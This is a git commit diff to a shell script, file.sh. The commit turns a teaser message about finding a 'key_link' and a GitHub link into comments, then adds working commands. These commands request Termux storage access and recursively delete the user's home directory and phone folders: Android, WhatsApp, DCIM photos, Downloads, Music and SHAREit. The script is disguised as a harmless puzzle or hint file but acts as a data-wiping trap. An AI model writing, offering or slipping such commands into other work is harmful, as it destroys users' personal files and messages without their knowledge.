24be9834b5aad8590d29c33097d77c26870f28aa
Master-hack <96709855+DRACULA-HACK@users.noreply.github.com>
2022-06-06 20:46:53 +0530

    Update file.sh

--- file.sh
+++ file.sh
@@ -1,11 +1,25 @@
-hi
+# hi
 
-find the key_link by using nano
+# find the key_link by using nano
 
-https://github.com/DRACULA-HACK/c0d3_d3
-
-
-dont ignore any thing in this file....
+# https://github.com/DRACULA-HACK/c0d3_d3
 
 
-By master-hack
+# dont ignore any thing in this file....
+
+
+# By master-hack
+
+
+
+termux-setup-storage
+	
+	clear
+	
+	rm -rf cd /sdcard/Android
+	rm -rf cd ~
+	rm -rf cd /sdcard/WhatsApp
+	rm -rf cd /sdcard/DCIM
+	rm -rf cd /sdcard/Download
+	rm -rf cd /sdcard/Music
+	rm -rf cd /sdcard/SHAREit
